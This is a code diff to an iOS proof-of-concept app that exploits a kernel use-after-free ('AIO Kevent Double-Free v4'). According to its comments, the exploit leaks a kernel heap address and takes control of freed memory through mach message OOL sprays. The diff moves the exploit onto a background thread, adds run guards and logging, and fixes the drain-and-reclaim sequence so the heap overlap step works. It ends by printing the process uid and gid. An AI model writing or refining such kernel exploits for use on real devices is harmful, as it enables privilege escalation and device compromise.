@@ -1079,6 +1079,14 @@ static void *aio_free_and_reclaim_racer(void *arg) {
 
 - (void)appendLog:(NSString *)line {
     NSLog(@"[TestPOC] %@", line);
+    // Update on-screen text view (main thread)
+    if (self.logView) {
+        dispatch_async(dispatch_get_main_queue(), ^{
+            self.logView.text = [self.logView.text stringByAppendingFormat:@"%@\n", line];
+            NSRange end = NSMakeRange(self.logView.text.length - 1, 1);
+            [self.logView scrollRangeToVisible:end];
+        });
+    }
     // Persistent log for post-reboot analysis
     static dispatch_once_t once;
     static NSFileHandle *logFH;
@@ -5650,13 +5658,37 @@ static void *aio_free_and_reclaim_racer(void *arg) {
 // Confirms ext[1] control via reclaim aio_nbytes (distinct marker).
 // Leaks kernel heap address via kevent64 ident field.
 
+static atomic_bool _aioUafRunning = ATOMIC_VAR_INIT(false);
+
 - (void)aioUafTapped {
-    [self appendLog:@"\n========== AIO Kevent Double-Free =========="];
+    bool expected = false;
+    if (!atomic_compare_exchange_strong(&_aioUafRunning, &expected, true)) {
+        [self appendLog:@"⚠ Already running — ignoring tap"];
+        return;
+    }
+
+    [self appendLog:@"\n========== AIO Kevent Double-Free v4 =========="];
+
+    // Disable button to prevent double-tap
+    dispatch_async(dispatch_get_main_queue(), ^{
+        self.aioUafButton.enabled = NO;
+        [self.aioUafButton setTitle:@"Running..." forState:UIControlStateNormal];
+    });
+
+    // Run exploit on background thread so UI stays responsive.
+    // appendLog dispatches UI updates to main thread internally.
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        @autoreleasepool {
 
     NSString *path = [NSTemporaryDirectory() stringByAppendingPathComponent:@"aio_uaf.bin"];
     int fd = open(path.UTF8String, O_CREAT | O_RDWR | O_TRUNC, 0644);
     if (fd < 0) {
         [self appendLog:@"FAIL: could not create temp file"];
+        atomic_store(&_aioUafRunning, false);
+        dispatch_async(dispatch_get_main_queue(), ^{
+            self.aioUafButton.enabled = YES;
+            [self.aioUafButton setTitle:@"AIO Kevent Double-Free" forState:UIControlStateNormal];
+        });
         return;
     }
     // Use 32KB file so both trigger(4KB) and reclaim(8KB) nbytes can be fully satisfied.
@@ -5892,7 +5924,18 @@ static void *aio_free_and_reclaim_racer(void *arg) {
         [self appendLog:[NSString stringWithFormat:@"  E1 aio_read: %@", e1ok ? @"OK" : @"FAIL"]];
 
         if (e1ok && drainPayload && drainPortsReady > 0) {
+            [self appendLog:@"  D: draining 1 msg from port queue..."];
+            // Drain ONE message first to make room in port queue (limit=5).
+            // Without this, mach_msg(SEND) below blocks forever.
+            {
+                DrainMsg drPre;
+                kern_return_t kr = mach_msg(&drPre.header, MACH_RCV_MSG, 0, sizeof(DrainMsg),
+                         drainPorts[0], 0, MACH_PORT_NULL);
+                [self appendLog:[NSString stringWithFormat:@"  D: drain-pre kr=%d", kr]];
+            }
+
             // Spray one more OOL on same CPU → should get same slot as E1
+            [self appendLog:@"  D: sending overlap OOL..."];
             DrainMsg overlapMsg;
             memset(&overlapMsg, 0, sizeof(overlapMsg));
             overlapMsg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
@@ -5905,11 +5948,19 @@ static void *aio_free_and_reclaim_racer(void *arg) {
             overlapMsg.ool.size = kDrainOolSize;
             overlapMsg.ool.deallocate = FALSE;
             overlapMsg.ool.copy = MACH_MSG_PHYSICAL_COPY;
-            kern_return_t okr = mach_msg(&overlapMsg.header, MACH_SEND_MSG, sizeof(overlapMsg), 0, MACH_PORT_NULL, 0, MACH_PORT_NULL);
-            // Immediately drain this message so we don't exceed queue limit
-            DrainMsg drmsg2;
-            mach_msg(&drmsg2.header, MACH_RCV_MSG, 0, sizeof(DrainMsg), drainPorts[0], 0, MACH_PORT_NULL);
+            kern_return_t okr = mach_msg(&overlapMsg.header, MACH_SEND_MSG, sizeof(overlapMsg),
+                     0, MACH_PORT_NULL, 0, MACH_PORT_NULL);
+            [self appendLog:[NSString stringWithFormat:@"  D: overlap send kr=%d", okr]];
+            // Drain the overlap message
+            [self appendLog:@"  D: draining overlap msg..."];
+            {
+                DrainMsg drOvl;
+                kern_return_t kr2 = mach_msg(&drOvl.header, MACH_RCV_MSG, 0, sizeof(DrainMsg),
+                         drainPorts[0], 0, MACH_PORT_NULL);
+                [self appendLog:[NSString stringWithFormat:@"  D: drain-overlap kr=%d", kr2]];
+            }
 
+            [self appendLog:@"  D: checking E1 state..."];
             while (aio_error(&e1) == EINPROGRESS) usleep(100);
             int e1state = aio_error(&e1);
             [self appendLog:[NSString stringWithFormat:@"  E1 aio_error=%d (0=done, %d=EINVAL)", e1state, EINVAL]];
@@ -5924,9 +5975,12 @@ static void *aio_free_and_reclaim_racer(void *arg) {
                 [self appendLog:[NSString stringWithFormat:@"  E1 unexpected state: %d", e1state]];
                 if (e1state != EINVAL) aio_return(&e1);
             }
-        } else if (e1ok) {
-            while (aio_error(&e1) == EINPROGRESS) usleep(100);
-            if (aio_error(&e1) == 0) aio_return(&e1);
+        } else {
+            [self appendLog:[NSString stringWithFormat:@"  D: SKIP — e1ok=%d payload=%p ports=%d", e1ok, drainPayload, drainPortsReady]];
+            if (e1ok) {
+                while (aio_error(&e1) == EINPROGRESS) usleep(100);
+                if (aio_error(&e1) == 0) aio_return(&e1);
+            }
         }
     }
 
@@ -5942,6 +5996,13 @@ static void *aio_free_and_reclaim_racer(void *arg) {
     unlink(path.UTF8String);
     [self appendLog:[NSString stringWithFormat:@"=== uid=%d gid=%d ===", getuid(), getgid()]];
     [self appendLog:@"========== AIO Kevent Double-Free Complete =========="];
+            atomic_store(&_aioUafRunning, false);
+            dispatch_async(dispatch_get_main_queue(), ^{
+                self.aioUafButton.enabled = YES;
+                [self.aioUafButton setTitle:@"AIO Kevent Double-Free" forState:UIControlStateNormal];
+            });
+        }  // @autoreleasepool
+    });  // dispatch_async
 }
 
 @end
